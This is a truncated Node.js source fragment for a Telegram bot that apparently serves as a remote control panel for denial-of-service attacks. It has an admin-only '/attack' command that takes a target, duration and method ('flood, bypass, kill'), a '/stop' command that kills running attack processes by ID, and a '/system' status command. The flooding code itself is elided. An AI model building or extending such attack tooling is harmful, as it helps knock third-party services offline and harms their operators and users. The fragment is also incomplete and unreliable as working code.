...
bot.onText(/\/attack (.+)/, (msg, match) => {
  ...
  if (chatId.toString() !== adminId) {
    bot.sendMessage(chatId, '*Access denied!* Only admin can use this command.', { parse_mode: 'Markdown' });
    return;
  }

  const args = match[1].split(' ');
  if (args.length < 3) {
    bot.sendMessage(chatId, '*Invalid command!* Usage: /attack [target] [time] [method]\nMethods: flood, bypass, kill', { parse_mode: 'Markdown' });
    return;
  }
  ...
  if (!validMethods.includes(method)) {
    bot.sendMessage(chatId, '*Invalid method!* Choose: flood, bypass, kill', { parse_mode: 'Markdown' });
    return;
  }
  ...
  process.on('exit', () => {
    bot.sendMessage(chatId, `*Attack ${attackId} finished!*`, { parse_mode: 'Markdown' });
...
bot.onText(/\/system/, async (msg) => {
  ...
  try {
    ...
    bot.sendMessage(chatId, '*Error retrieving system information!*', { parse_mode: 'Markdown' });
  }
});
...
bot.onText(/\/stop (.+)/, (msg, match) => {
  ...
  if (!processes[attackId]) {
    bot.sendMessage(chatId, `*No attack found with ID ${attackId}!*`, { parse_mode: 'Markdown' });
    return;
  }

  processes[attackId].kill();
  bot.sendMessage(chatId, `*Attack ${attackId} stopped!*`, { parse_mode: 'Markdown' });
  delete processes[attackId];
});
